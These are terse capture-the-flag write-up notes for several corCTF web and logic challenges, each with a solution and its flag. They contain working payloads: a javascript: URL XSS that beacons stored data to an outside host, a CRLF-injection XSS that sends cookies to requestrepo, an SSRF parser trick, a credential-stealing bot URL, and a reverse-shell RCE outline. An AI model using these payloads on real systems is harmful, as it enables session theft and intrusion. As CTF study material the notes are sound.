## corshop
u32 multiplication overflow in the total cost calculation, making the effective total 0: `buy 3 67108864`
`corctf{surpr1s3_1ts_wrapp3d_4nd_fr33}`

## yamlquiz
#yaml
```yaml
result:
	- score: 83:20
```

`corctf{ihateyamlihateyamlihateyaml!!!`

## safe-url
#javascript #url 

challenge:
```
const isSafeHostname = (hostname) => {
  return safeHostnames.some(safeHostname => hostname === safeHostname || hostname.endsWith(`.${safeHostname}`));
};

function safeRedirect(url) {
  try {
    const redirectUrl = new URL(url, window.location.origin);

    if (!isSafeHostname(redirectUrl.hostname)) {
      alert("hostname is not safe!");
      return;
    }

    if (redirectUrl.pathname.length >= 10) {
      alert("pathname is too long!");
      return;
    }

    const safeUrl = `${redirectUrl.protocol}//${redirectUrl.host}${redirectUrl.pathname}`;
    console.log("redirecting to", safeUrl, "...");
    window.location = safeUrl;
  } catch (error) {
    console.log("error: ", error);
  }
}
```

solution:
`javascript://%0aeval(name)%2f%2f.cor.team`
```html
<script>
  open("https://safe-url.ctfi.ng/?redirect=javascript%3A%2F%2F%250aeval%28name%29%252f%252f.cor.team","navigator.sendBeacon('//2ronjtes.requestrepo.com',localStorage.getItem('flag'))")
</script>
```

`corctf{but_i_already_p4tented_it_:(((}`

## msbug (unintended)
steal admin psw by submitting to bot: `https://msbug-2.ctfi.ng@attacker/`
```
username=admin&password=Ai6*/y[^o~2G*P+@P05ZM70
```
`corctf{g0tta_h4v3_4n_34sy_msfr0g_ch4ll3ng3}`


## voucherd
#timing

just bruteforce each char, the one that takes the longer time is the correct guess
`corctf{d0nt_w0rry_corCTF_2026_w1ll_b3_fr33!}`

## msfrognymize2

#python #url #ssrf #parser 

urlparse -> requests parser diff
```python
def create_file_url(uuid):
    file_url = urljoin("http://127.0.0.1:8000", "/" + uuid)

    parsed = urlparse(file_url)

    if parsed.scheme != "http":
        raise ValueError("Invalid sheme")
    if parsed.hostname != "127.0.0.1":
        raise ValueError("Invalid host")
    if parsed.port != 8000:
        raise ValueError("Invalid port")

    return file_url
```

payload: `/attacker.com%0A%5C@127.0.0.1:8000`

`corctf{why_4re_pyth0n_jo1n_funt10ns_s0_w3ird?!}`

# git
#xss #crlf #rce

1. xss via crlf injection
```
https://git-9b2f1d55fc203373.ctfi.ng/builtin?name=diff.js&mimetype=text/html%0d%0a%0d%0a<script>fetch('/cookies').then((response)=>response.text()).then((responseText)=>{fetch(`https://2ronjtes.requestrepo.com/?cookie=${encodeURIComponent(responseText)}`)})%3b</script>
```
2. rce
```
1. edit setup_notification config,
   perl -e 'revshell'
2. send email /announce
3. command is triggered -> rev shell
```

`corctf{h0me_r0ll3d_http_what_cou1d_g0_wr0ng?}`
